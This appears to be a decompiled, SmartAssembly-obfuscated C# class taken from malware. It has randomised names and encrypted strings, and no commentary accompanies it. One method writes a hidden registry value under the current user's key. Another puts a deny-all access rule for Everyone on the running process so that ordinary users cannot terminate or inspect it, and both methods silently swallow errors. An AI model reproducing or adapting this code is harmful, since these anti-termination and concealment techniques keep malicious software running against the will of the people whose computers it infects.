using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wDtIYaxdpawEu;

internal sealed class yLPBdfFOjZFxtU
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr RvmknhIhsnI, int gKSkZnVhUjp, [Out] byte[] CrryQdbIiXt, uint zCLkKMPRTzyiKe, out uint gFpvZeBtDBLOs);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr tycyWMrxMKdbcY, int cxAKTToYgpLWj, [In] byte[] RplOSxfMAW);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void oMCQOHhMwRNdQP(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(OwCGWssNrah.iBDvjzxzEcC(getString_0(107380631)));
			registryKey.SetValue(OwCGWssNrah.iBDvjzxzEcC(getString_0(107380558)), getString_0(107350503));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor nDHcvjJhnsX(IntPtr intptr_0)
	{
		byte[] crryQdbIiXt = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, crryQdbIiXt, 0u, out var gFpvZeBtDBLOs);
		if ((long)gFpvZeBtDBLOs > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, crryQdbIiXt = new byte[gFpvZeBtDBLOs], gFpvZeBtDBLOs, out gFpvZeBtDBLOs))
		{
			return null;
		}
		return new RawSecurityDescriptor(crryQdbIiXt, 0);
	}

	private void FiIAPCfWzaBwJdD(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void HeJiExjZeU()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = nDHcvjJhnsX(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			FiIAPCfWzaBwJdD(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static yLPBdfFOjZFxtU()
	{
		Strings.CreateGetStringDelegate(typeof(yLPBdfFOjZFxtU));
	}
}
